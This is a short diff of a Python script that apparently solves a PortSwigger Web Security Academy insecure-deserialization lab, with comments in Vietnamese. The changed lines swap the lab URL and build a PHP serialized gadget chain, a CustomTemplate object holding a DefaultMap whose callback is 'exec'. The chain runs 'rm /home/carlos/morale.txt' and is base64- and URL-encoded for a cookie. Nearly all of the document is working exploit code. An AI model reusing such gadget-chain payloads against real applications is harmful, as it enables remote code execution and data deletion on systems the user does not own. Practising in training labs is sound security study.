@@ -7,7 +7,7 @@ from bs4 import BeautifulSoup
 import base64
 from urllib.parse import quote
 
-url = 'https://0ac100c20301582f81ce454e00f300f8.web-security-academy.net'
+url = 'https://0a4400490495946f85c3ad2e001000d0.web-security-academy.net'
 
 session = requests.Session()
 
@@ -24,7 +24,7 @@ response = requests.post(
 )
 
 # lấy data từ cookie và xử lí
-data_cookies = 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}'
+data_cookies = 'O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}'
 encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
 encode_url = quote(encode_base64)
 solve = encode_url
